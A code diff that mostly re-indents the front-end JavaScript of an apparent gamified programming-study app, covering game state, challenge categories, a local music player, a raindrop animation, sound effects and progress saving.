-            '内置函数': [66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80],
-            '异常处理': [93, 94, 121, 122, 123, 124, 125],
-            '面向对象': [95, 96, 97, 98, 126, 127, 128, 129, 130],
-            '高级技巧': [99, 100, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140],
-            // 网络安全分类
-            'HTTP基础': [201, 202],
-            'Web漏洞': [203, 204, 205, 208],
-            '系统安全': [206, 207, 209, 210],
-            // C语言分类
-            'C基础': [301, 302, 303, 308],
-            'C指针': [304, 305, 306, 307],
-            // C++分类
-            'C++基础': [401, 402, 403, 404],
-            'C++OOP': [405, 406, 407, 408],
-            // Java分类
-            'Java基础': [501, 502, 503, 504],
-            'JavaOOP': [505, 506, 507, 508],
-            // CSS分类
-            'CSS基础': [601, 602, 603, 604, 605, 609],
-            'CSS布局': [606, 607, 608, 610, 611, 612],
-            // JavaScript分类
-            'JS基础': [701, 702, 703, 707, 709],
-            'JS进阶': [704, 705, 706, 708, 710, 711, 712],
-            // AI分类
-            'AI基础': [801, 802, 803, 807, 811],
-            '神经网络': [804, 805, 806, 808, 809, 810, 812],
-            // C语言额外分类
-            'C控制流': [309, 310, 311, 312],
-            // C++额外分类
-            'C++高级': [409, 410, 411, 412],
-            // Java额外分类
-            'Java高级': [509, 510, 511, 512]
-        };
+// ============== 游戏状态 ==============
+let gameState = {
+    currentPage: 'courseSelect',
+    selectedCourse: null, // 'python' 或 'security'
+    selectedCategory: null,
+    currentCardIndex: 0,
+    currentChallengeIndex: 0,
+    flippedCards: new Set(),
+    completedChallenges: new Set(),
+    totalXP: 0,
+    streak: 0,
+    maxStreak: 0,  // 最高连胜
+    unlockedAchievements: new Set(),
+    musicPlaying: false,
+    hintCount: 0,
+    // 筛选状态
+    filterDifficulty: 0,
+    filterStatus: 'all',
+    filterCategory: 'all',
+    currentProjectIndex: 0,
+    // 分页状态
+    challengePage: 0,
+    challengesPerPage: 12,
+    // 新增：错题本和统计
+    wrongAnswers: new Set(),  // 错题ID
+    totalAttempts: 0,  // 总答题次数
+    correctAttempts: 0,  // 正确次数
+    studyTime: 0,  // 学习时长(秒)
+    lastStudyDate: null,  // 上次学习日期
+    dailyGoal: 10,  // 每日目标题数
+    todayCompleted: 0  // 今日完成数
+};
 
-        // ============== 音乐播放器系统 ==============
-        let audioContext = null;
-        let audioPlayer = null;
-        let currentSongIndex = 0;
-        let playerMinimized = false;
-        
-        // 本地音乐播放列表
-        const PLAYLIST = [
-            // 林俊杰
-            { name: '林俊杰 - 江南', url: 'music/林俊杰 - 江南.mp3' },
-            { name: '林俊杰 - 她说', url: 'music/林俊杰 - 她说.mp3' },
-            { name: '林俊杰 - 可惜没如果', url: 'music/林俊杰 - 可惜没如果.mp3' },
-            { name: '林俊杰 - 曹操', url: 'music/林俊杰 - 曹操.mp3' },
-            { name: '林俊杰 - 醉赤壁', url: 'music/林俊杰 - 醉赤壁.mp3' },
-            { name: '林俊杰 - 一千年以后', url: 'music/林俊杰 - 一千年以后.mp3' },
-            { name: '林俊杰 - 记得', url: 'music/林俊杰 - 记得.mp3' },
-            { name: '林俊杰 - 背对背拥抱', url: 'music/林俊杰 - 背对背拥抱.mp3' },
-            // 薛之谦
-            { name: '薛之谦 - 演员', url: 'music/薛之谦 - 演员.mp3' },
-            { name: '薛之谦 - 绅士', url: 'music/薛之谦 - 绅士.mp3' },
-            { name: '薛之谦 - 认真的雪', url: 'music/薛之谦 - 认真的雪.mp3' },
-            { name: '薛之谦 - 像风一样', url: 'music/薛之谦 - 像风一样.mp3' },
-            // 许嵩
-            { name: '许嵩 - 清明雨上', url: 'music/许嵩 - 清明雨上.mp3' },
-            { name: '许嵩 - 断桥残雪', url: 'music/许嵩 - 断桥残雪.mp3' },
-            { name: '许嵩 - 有何不可', url: 'music/许嵩 - 有何不可.mp3' },
-            { name: '许嵩 - 玫瑰花的葬礼', url: 'music/许嵩 - 玫瑰花的葬礼.mp3' },
-            // 李荣浩
-            { name: '李荣浩 - 李白', url: 'music/李荣浩 - 李白.mp3' },
-            { name: '李荣浩 - 模特', url: 'music/李荣浩 - 模特.mp3' },
-            { name: '李荣浩 - 老街', url: 'music/李荣浩 - 老街.mp3' },
-            { name: '李荣浩 - 麻雀', url: 'music/李荣浩 - 麻雀.mp3' },
-            // 陈奕迅
-            { name: '陈奕迅 - 十年', url: 'music/陈奕迅 - 十年.mp3' },
-            { name: '陈奕迅 - 富士山下', url: 'music/陈奕迅 - 富士山下.mp3' },
-            { name: '陈奕迅 - K歌之王', url: 'music/陈奕迅 - K歌之王.mp3' },
-            // 陶喆
-            { name: '陶喆 - 就是爱你', url: 'music/陶喆 - 就是爱你.mp3' },
-            { name: '陶喆 - 爱，很简单', url: 'music/陶喆 - 爱，很简单.mp3' },
-            { name: '陶喆 - 普通朋友', url: 'music/陶喆 - 普通朋友.mp3' },
-            { name: '陶喆 - 流沙', url: 'music/陶喆 - 流沙.mp3' },
-            // 汪苏泷
-            { name: '汪苏泷 - 有点甜', url: 'music/汪苏泷,By2 - 有点甜.mp3' },
-            { name: '汪苏泷 - 不分手的恋爱', url: 'music/汪苏泷 - 不分手的恋爱.mp3' },
-            // 赵雷
-            { name: '赵雷 - 成都', url: 'music/赵雷 - 成都.mp3' },
-            { name: '赵雷 - 南方姑娘', url: 'music/赵雷 - 南方姑娘.mp3' },
-            // 孙燕姿
-            { name: '孙燕姿 - 天黑黑', url: 'music/孙燕姿 - 天黑黑.mp3' },
-            { name: '孙燕姿 - 我怀念的', url: 'music/孙燕姿 - 我怀念的.mp3' },
-            // 邓紫棋
-            { name: '邓紫棋 - 唯一', url: 'music/G.E.M.邓紫棋 - 唯一.mp3' },
-            // 王力宏
-            { name: '王力宏 - 你不知道的事', url: 'music/王力宏 - 你不知道的事.mp3' },
-            { name: '王力宏 - 大城小爱', url: 'music/王力宏 - 大城小爱.mp3' },
-        ];
-        
-        // 音符频率 (用于音效)
-        const NOTES = {
-            C4: 261.63, D4: 293.66, E4: 329.63, F4: 349.23,
-            G4: 392.00, A4: 440.00, B4: 493.88, C5: 523.25,
-            D5: 587.33, E5: 659.25, G5: 783.99
-        };
-        
-        function initAudio() {
-            if (!audioContext) {
-                audioContext = new (window.AudioContext || window.webkitAudioContext)();
-            }
-        }
-        
-        function initMusicPlayer() {
-            if (!audioPlayer) {
-                audioPlayer = new Audio();
-                audioPlayer.volume = 0.5;
-                audioPlayer.addEventListener('error', () => {
-                    console.log('音乐加载失败，尝试下一首');
-                    nextSong();
-                });
-            }
-        }
-        
-        function toggleMusicPlayer() {
-            initMusicPlayer();
-            
-            if (audioPlayer.paused) {
-                playSong(currentSongIndex);
-            } else {
-                audioPlayer.pause();
-            }
-            updatePlayerUI();
-        }
-        
-        function togglePlayerSize() {
-            playerMinimized = !playerMinimized;
-            updatePlayerUI();
-        }
-        
-        function updatePlayerUI() {
-            const container = document.getElementById('music-player');
-            if (!container) return;
-            
-            const currentSong = PLAYLIST[currentSongIndex];
-            const isPlaying = audioPlayer && !audioPlayer.paused;
-            const waveClass = isPlaying ? 'music-wave' : 'music-wave paused';
-            
-            const rainDropsHTML = `
+// 学习时长计时器
+let studyTimer = null;
+function startStudyTimer() {
+    if (!studyTimer) {
+        studyTimer = setInterval(() => {
+            gameState.studyTime++;
+            // 每分钟保存一次
+            if (gameState.studyTime % 60 === 0) saveProgress();
+        }, 1000);
+    }
+}
+startStudyTimer();
+
+// 题目分类映射
+const CHALLENGE_CATEGORIES = {
+    '基础语法': [1, 2, 3, 4, 5, 6, 7, 8, 9, 10],
+    'GUI界面': [11, 39, 40, 41, 42],
+    '数据处理': [12, 43, 44, 45, 46],
+    '网络爬虫': [13, 14, 47, 48, 49, 50],
+    '正则表达式': [15, 101, 102, 103, 104, 105],
+    '字符串': [16, 17, 18, 19, 20, 56, 57, 58, 59, 60, 81, 82, 83, 84],
+    '列表': [21, 22, 23, 24, 25, 85, 86, 87, 88],
+    '字典': [26, 27, 28, 106, 107, 108, 109, 110],
+    '控制流': [29, 30, 31, 32, 89, 90, 91, 92],
+    '函数': [33, 34, 35, 111, 112, 113, 114, 115],
+    '文件操作': [36, 37, 38, 116, 117, 118, 119, 120],
+    '类型转换': [51, 52, 53, 54, 55],
+    '集合元组': [61, 62, 63, 64, 65],
+    '内置函数': [66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80],
+    '异常处理': [93, 94, 121, 122, 123, 124, 125],
+    '面向对象': [95, 96, 97, 98, 126, 127, 128, 129, 130],
+    '高级技巧': [99, 100, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140],
+    // 网络安全分类
+    'HTTP基础': [201, 202],
+    'Web漏洞': [203, 204, 205, 208],
+    '系统安全': [206, 207, 209, 210],
+    // C语言分类
+    'C基础': [301, 302, 303, 308],
+    'C指针': [304, 305, 306, 307],
+    // C++分类
+    'C++基础': [401, 402, 403, 404],
+    'C++OOP': [405, 406, 407, 408],
+    // Java分类
+    'Java基础': [501, 502, 503, 504],
+    'JavaOOP': [505, 506, 507, 508],
+    // CSS分类
+    'CSS基础': [601, 602, 603, 604, 605, 609],
+    'CSS布局': [606, 607, 608, 610, 611, 612],
+    // JavaScript分类
+    'JS基础': [701, 702, 703, 707, 709],
+    'JS进阶': [704, 705, 706, 708, 710, 711, 712],
+    // AI分类
+    'AI基础': [801, 802, 803, 807, 811],
+    '神经网络': [804, 805, 806, 808, 809, 810, 812],
+    // C语言额外分类
+    'C控制流': [309, 310, 311, 312],
+    // C++额外分类
+    'C++高级': [409, 410, 411, 412],
+    // Java额外分类
+    'Java高级': [509, 510, 511, 512]
+};
+
+// ============== 音乐播放器系统 ==============
+let audioContext = null;
+let audioPlayer = null;
+let currentSongIndex = 0;
+let playerMinimized = false;
+
+// 本地音乐播放列表
+const PLAYLIST = [
+    // 林俊杰
+    { name: '林俊杰 - 江南', url: 'music/林俊杰 - 江南.mp3' },
+    { name: '林俊杰 - 她说', url: 'music/林俊杰 - 她说.mp3' },
+    { name: '林俊杰 - 可惜没如果', url: 'music/林俊杰 - 可惜没如果.mp3' },
+    { name: '林俊杰 - 曹操', url: 'music/林俊杰 - 曹操.mp3' },
+    { name: '林俊杰 - 醉赤壁', url: 'music/林俊杰 - 醉赤壁.mp3' },
+    { name: '林俊杰 - 一千年以后', url: 'music/林俊杰 - 一千年以后.mp3' },
+    { name: '林俊杰 - 记得', url: 'music/林俊杰 - 记得.mp3' },
+    { name: '林俊杰 - 背对背拥抱', url: 'music/林俊杰 - 背对背拥抱.mp3' },
+    // 薛之谦
+    { name: '薛之谦 - 演员', url: 'music/薛之谦 - 演员.mp3' },
+    { name: '薛之谦 - 绅士', url: 'music/薛之谦 - 绅士.mp3' },
+    { name: '薛之谦 - 认真的雪', url: 'music/薛之谦 - 认真的雪.mp3' },
+    { name: '薛之谦 - 像风一样', url: 'music/薛之谦 - 像风一样.mp3' },
+    // 许嵩
+    { name: '许嵩 - 清明雨上', url: 'music/许嵩 - 清明雨上.mp3' },
+    { name: '许嵩 - 断桥残雪', url: 'music/许嵩 - 断桥残雪.mp3' },
+    { name: '许嵩 - 有何不可', url: 'music/许嵩 - 有何不可.mp3' },
+    { name: '许嵩 - 玫瑰花的葬礼', url: 'music/许嵩 - 玫瑰花的葬礼.mp3' },
+    // 李荣浩
+    { name: '李荣浩 - 李白', url: 'music/李荣浩 - 李白.mp3' },
+    { name: '李荣浩 - 模特', url: 'music/李荣浩 - 模特.mp3' },
+    { name: '李荣浩 - 老街', url: 'music/李荣浩 - 老街.mp3' },
+    { name: '李荣浩 - 麻雀', url: 'music/李荣浩 - 麻雀.mp3' },
+    // 陈奕迅
+    { name: '陈奕迅 - 十年', url: 'music/陈奕迅 - 十年.mp3' },
+    { name: '陈奕迅 - 富士山下', url: 'music/陈奕迅 - 富士山下.mp3' },
+    { name: '陈奕迅 - K歌之王', url: 'music/陈奕迅 - K歌之王.mp3' },
+    // 陶喆
+    { name: '陶喆 - 就是爱你', url: 'music/陶喆 - 就是爱你.mp3' },
+    { name: '陶喆 - 爱，很简单', url: 'music/陶喆 - 爱，很简单.mp3' },
+    { name: '陶喆 - 普通朋友', url: 'music/陶喆 - 普通朋友.mp3' },
+    { name: '陶喆 - 流沙', url: 'music/陶喆 - 流沙.mp3' },
+    // 汪苏泷
+    { name: '汪苏泷 - 有点甜', url: 'music/汪苏泷,By2 - 有点甜.mp3' },
+    { name: '汪苏泷 - 不分手的恋爱', url: 'music/汪苏泷 - 不分手的恋爱.mp3' },
+    // 赵雷
+    { name: '赵雷 - 成都', url: 'music/赵雷 - 成都.mp3' },
+    { name: '赵雷 - 南方姑娘', url: 'music/赵雷 - 南方姑娘.mp3' },
+    // 孙燕姿
+    { name: '孙燕姿 - 天黑黑', url: 'music/孙燕姿 - 天黑黑.mp3' },
+    { name: '孙燕姿 - 我怀念的', url: 'music/孙燕姿 - 我怀念的.mp3' },
+    // 邓紫棋
+    { name: '邓紫棋 - 唯一', url: 'music/G.E.M.邓紫棋 - 唯一.mp3' },
+    // 王力宏
+    { name: '王力宏 - 你不知道的事', url: 'music/王力宏 - 你不知道的事.mp3' },
+    { name: '王力宏 - 大城小爱', url: 'music/王力宏 - 大城小爱.mp3' },
+];
+
+// 音符频率 (用于音效)
+const NOTES = {
+    C4: 261.63, D4: 293.66, E4: 329.63, F4: 349.23,
+    G4: 392.00, A4: 440.00, B4: 493.88, C5: 523.25,
+    D5: 587.33, E5: 659.25, G5: 783.99
+};
+
+function initAudio() {
+    if (!audioContext) {
+        audioContext = new (window.AudioContext || window.webkitAudioContext)();
+    }
+}
+
+function initMusicPlayer() {
+    if (!audioPlayer) {
+        audioPlayer = new Audio();
+        audioPlayer.volume = 0.5;
+        audioPlayer.addEventListener('error', () => {
+            console.log('音乐加载失败，尝试下一首');
+            nextSong();
+        });
+    }
+}
+
+function toggleMusicPlayer() {
+    initMusicPlayer();
+
+    if (audioPlayer.paused) {
+        playSong(currentSongIndex);
+    } else {
+        audioPlayer.pause();
+    }
+    updatePlayerUI();
+}
+
+function togglePlayerSize() {
+    playerMinimized = !playerMinimized;
+    updatePlayerUI();
+}
+
+function updatePlayerUI() {
+    const container = document.getElementById('music-player');
+    if (!container) return;
+
+    const currentSong = PLAYLIST[currentSongIndex];
+    const isPlaying = audioPlayer && !audioPlayer.paused;
+    const waveClass = isPlaying ? 'music-wave' : 'music-wave paused';
+
+    const rainDropsHTML = `
                     <div class="rain-drops">
                         <div class="rain-drop"></div>
                         <div class="rain-drop"></div>
@@ -3471,9 +3471,9 @@ check_sensitive_files(url)`,
                         <div class="rain-drop"></div>
                     </div>
                 `;
-            
-            if (playerMinimized) {
-                container.innerHTML = `
+
+    if (playerMinimized) {
+        container.innerHTML = `
                     ${rainDropsHTML}
                     <div class="flex items-center gap-3 relative z-10">
                         <div class="${waveClass}">
@@ -3487,9 +3487,9 @@ check_sensitive_files(url)`,
                         </button>
                     </div>
                 `;
-                container.classList.add('minimized');
-            } else {
-                container.innerHTML = `
+        container.classList.add('minimized');
+    } else {
+        container.innerHTML = `
                     ${rainDropsHTML}
                     <div class="flex items-center gap-4 relative z-10">
                         <!-- 波形动画 -->
@@ -3529,489 +3529,489 @@ check_sensitive_files(url)`,
                         </button>
                     </div>
                 `;
-                container.classList.remove('minimized');
-            }
-        }
-        
-        function togglePlay() {
-            initMusicPlayer();
-            if (audioPlayer.paused) {
-                audioPlayer.src = PLAYLIST[currentSongIndex].url;
-                audioPlayer.play().catch(e => console.log('播放失败:', e));
-                startRainEffect();
-            } else {
-                audioPlayer.pause();
-                stopRainEffect();
-            }
-            setTimeout(updatePlayerUI, 100);
-        }
-        
-        function playSong(index) {
-            initMusicPlayer();
-            currentSongIndex = parseInt(index);
-            audioPlayer.src = PLAYLIST[currentSongIndex].url;
-            audioPlayer.play().catch(e => console.log('播放失败:', e));
-            startRainEffect();
-            setTimeout(updatePlayerUI, 100);
-        }
-        
-        function nextSong() {
-            currentSongIndex = (currentSongIndex + 1) % PLAYLIST.length;
-            playSong(currentSongIndex);
-        }
-        
-        function prevSong() {
-            currentSongIndex = (currentSongIndex - 1 + PLAYLIST.length) % PLAYLIST.length;
-            playSong(currentSongIndex);
-        }
-        
-        // 全屏雨滴效果 - 真实流动雨滴
-        let rainAnimationId = null;
-        let drops = [];
-        
-        class WaterDrop {
-            constructor(container) {
-                this.container = container;
-                this.x = Math.random() * window.innerWidth;
-                this.y = Math.random() * -100;
-                this.size = Math.random() * 10 + 8;
-                // 速度较慢：0.2 ~ 1.5
-                this.speed = Math.random() * 1.3 + 0.2;
-                this.scattered = false;
-                this.scatterChance = Math.random(); // 是否会被吹散
-                this.scatterY = Math.random() * window.innerHeight * 0.7 + window.innerHeight * 0.1;
-                
-                this.element = document.createElement('div');
-                this.element.className = 'water-drop';
-                this.setShape();
-                container.appendChild(this.element);
-            }
-            
-            // 设置水滴形状 - 多种随机形状
-            setShape() {
-                const shapeType = Math.floor(Math.random() * 5);
-                const w = this.size;
-                let h, borderRadius;
-                
-                switch(shapeType) {
-                    case 0: // 标准泪滴
-                        h = w * (1.4 + Math.random() * 0.3);
-                        borderRadius = '50% 50% 50% 50% / 25% 25% 65% 65%';
-                        break;
-                    case 1: // 圆润水珠
-                        h = w * (1.0 + Math.random() * 0.2);
-                        borderRadius = '50%';
-                        break;
-                    case 2: // 椭圆形
-                        h = w * (1.2 + Math.random() * 0.4);
-                        borderRadius = '45% 55% 55% 45% / 35% 35% 55% 55%';
-                        break;
-                    case 3: // 尖锐泪滴
-                        h = w * (1.6 + Math.random() * 0.4);
-                        borderRadius = '40% 40% 50% 50% / 15% 15% 70% 70%';
-                        break;
-                    case 4: // 不规则水滴
-                        h = w * (1.3 + Math.random() * 0.3);
-                        const tl = Math.floor(Math.random() * 25 + 35);
-                        const tr = Math.floor(Math.random() * 25 + 35);
-                        const bl = Math.floor(Math.random() * 15 + 45);
-                        const br = Math.floor(Math.random() * 15 + 45);
-                        const vt = Math.floor(Math.random() * 15 + 20);
-                        const vb = Math.floor(Math.random() * 15 + 55);
-                        borderRadius = `${tl}% ${tr}% ${br}% ${bl}% / ${vt}% ${vt}% ${vb}% ${vb}%`;
-                        break;
-                }
-                
-                this.element.style.width = w + 'px';
-                this.element.style.height = h + 'px';
-                this.element.style.borderRadius = borderRadius;
-            }
-            
-            // 吹散效果 - 分裂成小水珠
-            scatter() {
-                this.scattered = true;
-                const numParticles = Math.floor(Math.random() * 4) + 3;
-                
-                for (let i = 0; i < numParticles; i++) {
-                    const particle = document.createElement('div');
-                    particle.className = 'scatter-particle';
-                    particle.style.left = this.x + 'px';
-                    particle.style.top = this.y + 'px';
-                    
-                    const size = Math.random() * 4 + 2;
-                    particle.style.width = size + 'px';
-                    particle.style.height = size + 'px';
-                    
-                    // 随机飞散方向
-                    const angle = (Math.random() - 0.5) * Math.PI;
-                    const distance = Math.random() * 60 + 30;
-                    const tx = Math.sin(angle) * distance;
-                    const ty = Math.cos(angle) * distance * 0.5 - 20;
-                    
-                    particle.style.setProperty('--tx', tx + 'px');
-                    particle.style.setProperty('--ty', ty + 'px');
-                    
-                    this.container.appendChild(particle);
-                    
-                    setTimeout(() => particle.remove(), 600);
-                }
-                
-                // 隐藏原水滴
-                this.element.style.opacity = '0';
-                this.element.style.transform = 'scale(0)';
-            }
-            
-            update() {
-                if (this.scattered) {
-                    // 已被吹散，等待重置
-                    if (this.y > window.innerHeight + 50) {
-                        this.reset();
-                    }
-                    this.y += this.speed;
-                    return;
-                }
-                
-                // 向下流动，带一点横向摆动
-                this.y += this.speed;
-                this.x += Math.sin(this.y * 0.015) * 0.2;
-                
-                // 检查是否要被吹散（20%概率）
-                if (this.scatterChance < 0.2 && this.y > this.scatterY && !this.scattered) {
-                    this.scatter();
-                    return;
-                }
-                
-                // 更新水滴位置
-                this.element.style.left = this.x + 'px';
-                this.element.style.top = this.y + 'px';
-                
-                // 超出屏幕重置
-                if (this.y > window.innerHeight + 50) {
-                    this.reset();
-                }
-            }
-            
-            reset() {
-                this.x = Math.random() * window.innerWidth;
-                this.y = Math.random() * -200 - 50;
-                this.speed = Math.random() * 1.3 + 0.2;
-                this.size = Math.random() * 10 + 8;
-                this.scattered = false;
-                this.scatterChance = Math.random();
-                this.scatterY = Math.random() * window.innerHeight * 0.7 + window.innerHeight * 0.1;
-                this.element.style.opacity = '1';
-                this.element.style.transform = 'scale(1)';
-                this.setShape();
-            }
-            
-            remove() {
-                this.element.remove();
-            }
-        }
-        
-        // 小水珠类
-        class TinyDrop {
-            constructor(container) {
-                this.container = container;
-                this.element = document.createElement('div');
-                this.element.className = 'tiny-drop';
-                
-                const size = Math.random() * 4 + 2;
-                this.element.style.width = size + 'px';
-                this.element.style.height = size + 'px';
-                this.element.style.left = Math.random() * 100 + '%';
-                this.element.style.top = Math.random() * 100 + '%';
-                this.element.style.opacity = Math.random() * 0.6 + 0.2;
-                
-                container.appendChild(this.element);
-            }
-            
-            remove() {
-                this.element.remove();
-            }
-        }
-        
-        // 滑动水滴类 - 在屏幕上缓慢滑落
-        class SlidingDrop {
-            constructor(container) {
-                this.container = container;
-                this.x = Math.random() * window.innerWidth;
-                this.y = Math.random() * window.innerHeight * 0.3; // 从上部开始
-                this.size = Math.random() * 14 + 10;
-                this.speed = Math.random() * 0.3 + 0.1; // 非常慢
-                this.wobble = Math.random() * 0.5 + 0.2;
-                
-                this.element = document.createElement('div');
-                this.element.className = 'water-drop sliding';
-                this.setShape();
-                container.appendChild(this.element);
-                
-                // 水痕
-                this.trail = document.createElement('div');
-                this.trail.className = 'slide-trail';
-                this.trail.style.left = (this.x + this.size * 0.4) + 'px';
-                this.trail.style.top = this.y + 'px';
-                this.trail.style.width = '2px';
-                this.trail.style.height = '0px';
-                container.appendChild(this.trail);
-                
-                this.startY = this.y;
-            }
-            
-            setShape() {
-                const w = this.size;
-                const h = this.size * (1.3 + Math.random() * 0.4);
-                this.element.style.width = w + 'px';
-                this.element.style.height = h + 'px';
-                this.element.style.borderRadius = '45% 45% 50% 50% / 30% 30% 60% 60%';
-            }
-            
-            update() {
-                this.y += this.speed;
-                this.x += Math.sin(this.y * 0.01) * this.wobble;
-                
-                this.element.style.left = this.x + 'px';
-                this.element.style.top = this.y + 'px';
-                
-                // 更新水痕
-                const trailHeight = this.y - this.startY;
-                this.trail.style.height = Math.min(trailHeight, 150) + 'px';
-                this.trail.style.opacity = Math.max(0, 0.3 - trailHeight / 500);
-                
-                if (this.y > window.innerHeight + 50) {
-                    this.reset();
-                }
-            }
-            
-            reset() {
-                this.x = Math.random() * window.innerWidth;
-                this.y = Math.random() * -100 - 50;
-                this.startY = this.y;
-                this.speed = Math.random() * 0.3 + 0.1;
-                this.trail.style.left = (this.x + this.size * 0.4) + 'px';
-                this.trail.style.top = this.y + 'px';
-                this.trail.style.height = '0px';
-            }
-            
-            remove() {
-                this.element.remove();
-                this.trail.remove();
-            }
-        }
-        
-        let slidingDrops = [];
-        
-        function startRainEffect() {
-            const container = document.getElementById('fullscreen-rain');
-            if (!container) return;
-            
-            container.classList.add('active');
-            container.innerHTML = '';
-            drops = [];
-            slidingDrops = [];
-            
-            // 创建下落的水滴
-            for (let i = 0; i < 6; i++) {
-                setTimeout(() => {
-                    const drop = new WaterDrop(container);
-                    drop.y = Math.random() * window.innerHeight;
-                    drops.push(drop);
-                }, i * 200);
-            }
-            
-            // 创建滑动水滴（少量，缓慢滑落）
-            for (let i = 0; i < 3; i++) {
-                setTimeout(() => {
-                    const slide = new SlidingDrop(container);
-                    slidingDrops.push(slide);
-                }, i * 500);
-            }
-            
-            // 创建静止小水珠
-            for (let i = 0; i < 12; i++) {
-                new TinyDrop(container);
-            }
-            
-            // 动画循环
-            function animate() {
-                drops.forEach(drop => drop.update());
-                slidingDrops.forEach(drop => drop.update());
-                rainAnimationId = requestAnimationFrame(animate);
-            }
-            animate();
-        }
-        
-        function stopRainEffect() {
-            const container = document.getElementById('fullscreen-rain');
-            if (container) {
-                container.classList.remove('active');
-            }
-            
-            if (rainAnimationId) {
-                cancelAnimationFrame(rainAnimationId);
-                rainAnimationId = null;
-            }
-            
-            drops.forEach(drop => drop.remove());
-            drops = [];
-            slidingDrops.forEach(drop => drop.remove());
-            slidingDrops = [];
-            
-            setTimeout(() => {
-                if (container) container.innerHTML = '';
-            }, 500);
-        }
-        
-        function setVolume(value) {
-            if (audioPlayer) audioPlayer.volume = value / 100;
-        }
-        
-        function renderMusicPlayer() {
-            return `<div id="music-player" class="music-player"></div>`;
-        }
-        
-        // 音效系统
-        function playNote(frequency, duration, volume = 0.15, type = 'sine') {
-            initAudio();
-            if (!audioContext || !frequency) return;
-            
-            const oscillator = audioContext.createOscillator();
-            const gainNode = audioContext.createGain();
-            
-            oscillator.connect(gainNode);
-            gainNode.connect(audioContext.destination);
-            
-            oscillator.frequency.value = frequency;
-            oscillator.type = type;
-            
-            const now = audioContext.currentTime;
-            gainNode.gain.setValueAtTime(volume, now);
-            gainNode.gain.exponentialRampToValueAtTime(0.01, now + duration);
-            
-            oscillator.start(now);
-            oscillator.stop(now + duration);
-        }
-        
-        function playSuccessSound() {
-            setTimeout(() => playNote(NOTES.C5, 0.15, 0.2), 0);
-            setTimeout(() => playNote(NOTES.E5, 0.15, 0.2), 100);
-            setTimeout(() => playNote(NOTES.G5, 0.3, 0.2), 200);
-        }
-        
-        function playErrorSound() {
-            playNote(200, 0.3, 0.15, 'square');
-        }
-        
-        function playFlipSound() {
-            playNote(NOTES.G4, 0.1, 0.1);
-        }
-        
-        function playClickSound() {
-            playNote(NOTES.C5, 0.05, 0.08);
-        }
-        
-        // 格式化解释内容，让换行和格式更清晰
-        function formatExplanation(text) {
-            if (!text) return '';
-            return text
-                // 先处理字面的\n字符串
-                .split('\\n\\n').join('<br><br>')
-                .split('\\n').join('<br>')
-                // 处理实际换行符
-                .split('\n\n').join('<br><br>')
-                .split('\n').join('<br>')
-                // emoji颜色
-                .replace(/📌/g, '<span class="text-yellow-400 font-bold">📌</span>')
-                .replace(/🔹/g, '<br><span class="text-blue-400">🔹</span>')
-                .replace(/💡/g, '<br><br><span class="text-yellow-300 font-medium">💡</span>')
-                .replace(/🎯/g, '<br><br><span class="text-green-400 font-medium">🎯</span>')
-                .replace(/📝/g, '<br><span class="text-purple-400">📝</span>')
-                .replace(/🔄/g, '<br><span class="text-cyan-400">🔄</span>')
-                .replace(/•/g, '<br>&nbsp;&nbsp;•');
+        container.classList.remove('minimized');
+    }
+}
+
+function togglePlay() {
+    initMusicPlayer();
+    if (audioPlayer.paused) {
+        audioPlayer.src = PLAYLIST[currentSongIndex].url;
+        audioPlayer.play().catch(e => console.log('播放失败:', e));
+        startRainEffect();
+    } else {
+        audioPlayer.pause();
+        stopRainEffect();
+    }
+    setTimeout(updatePlayerUI, 100);
+}
+
+function playSong(index) {
+    initMusicPlayer();
+    currentSongIndex = parseInt(index);
+    audioPlayer.src = PLAYLIST[currentSongIndex].url;
+    audioPlayer.play().catch(e => console.log('播放失败:', e));
+    startRainEffect();
+    setTimeout(updatePlayerUI, 100);
+}
+
+function nextSong() {
+    currentSongIndex = (currentSongIndex + 1) % PLAYLIST.length;
+    playSong(currentSongIndex);
+}
+
+function prevSong() {
+    currentSongIndex = (currentSongIndex - 1 + PLAYLIST.length) % PLAYLIST.length;
+    playSong(currentSongIndex);
+}
+
+// 全屏雨滴效果 - 真实流动雨滴
+let rainAnimationId = null;
+let drops = [];
+
+class WaterDrop {
+    constructor(container) {
+        this.container = container;
+        this.x = Math.random() * window.innerWidth;
+        this.y = Math.random() * -100;
+        this.size = Math.random() * 10 + 8;
+        // 速度较慢：0.2 ~ 1.5
+        this.speed = Math.random() * 1.3 + 0.2;
+        this.scattered = false;
+        this.scatterChance = Math.random(); // 是否会被吹散
+        this.scatterY = Math.random() * window.innerHeight * 0.7 + window.innerHeight * 0.1;
+
+        this.element = document.createElement('div');
+        this.element.className = 'water-drop';
+        this.setShape();
+        container.appendChild(this.element);
+    }
+
+    // 设置水滴形状 - 多种随机形状
+    setShape() {
+        const shapeType = Math.floor(Math.random() * 5);
+        const w = this.size;
+        let h, borderRadius;
+
+        switch (shapeType) {
+            case 0: // 标准泪滴
+                h = w * (1.4 + Math.random() * 0.3);
+                borderRadius = '50% 50% 50% 50% / 25% 25% 65% 65%';
+                break;
+            case 1: // 圆润水珠
+                h = w * (1.0 + Math.random() * 0.2);
+                borderRadius = '50%';
+                break;
+            case 2: // 椭圆形
+                h = w * (1.2 + Math.random() * 0.4);
+                borderRadius = '45% 55% 55% 45% / 35% 35% 55% 55%';
+                break;
+            case 3: // 尖锐泪滴
+                h = w * (1.6 + Math.random() * 0.4);
+                borderRadius = '40% 40% 50% 50% / 15% 15% 70% 70%';
+                break;
+            case 4: // 不规则水滴
+                h = w * (1.3 + Math.random() * 0.3);
+                const tl = Math.floor(Math.random() * 25 + 35);
+                const tr = Math.floor(Math.random() * 25 + 35);
+                const bl = Math.floor(Math.random() * 15 + 45);
+                const br = Math.floor(Math.random() * 15 + 45);
+                const vt = Math.floor(Math.random() * 15 + 20);
+                const vb = Math.floor(Math.random() * 15 + 55);
+                borderRadius = `${tl}% ${tr}% ${br}% ${bl}% / ${vt}% ${vt}% ${vb}% ${vb}%`;
+                break;
         }
 
-        // 从localStorage加载进度
-        function loadProgress() {
-            const saved = localStorage.getItem('codingGameProgress');
-            if (saved) {
-                const data = JSON.parse(saved);
-                gameState.flippedCards = new Set(data.flippedCards || []);
-                gameState.completedChallenges = new Set(data.completedChallenges || []);
-                gameState.totalXP = data.totalXP || 0;
-                gameState.unlockedAchievements = new Set(data.unlockedAchievements || []);
-                // 新增数据
